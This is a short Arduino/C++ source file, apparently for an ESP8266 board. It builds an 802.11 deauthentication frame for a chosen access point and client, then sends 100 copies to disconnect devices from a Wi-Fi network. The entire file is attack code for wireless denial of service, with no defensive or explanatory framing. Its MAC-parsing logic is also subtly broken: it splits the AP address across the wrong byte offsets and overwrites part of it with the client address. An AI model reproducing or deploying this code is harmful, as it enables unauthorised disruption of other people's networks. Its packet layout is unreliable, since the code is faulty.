#include "attack.h"

void sendDeauth(const String& targetAP, const String& targetClient) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01,  // Frame Control
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (AP MAC)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (AP MAC)
        0x00, 0x00,  // Fragment & Sequence Number
        0x07, 0x00   // Reason Code
    };

    // Parse MAC addresses
    sscanf(targetAP.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &deauthPacket[10], &deauthPacket[11], &deauthPacket[12],
           &deauthPacket[16], &deauthPacket[17], &deauthPacket[18]);

    if (targetClient != "FF:FF:FF:FF:FF:FF") {
        sscanf(targetClient.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &deauthPacket[4], &deauthPacket[5], &deauthPacket[6],
               &deauthPacket[10], &deauthPacket[11], &deauthPacket[12]);
    }

    Serial.println("Sending deauth packets...");
    for (int i = 0; i < 100; i++) {  // Send 100 packets
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        delay(10);
    }
    Serial.println("Deauth attack complete.");
}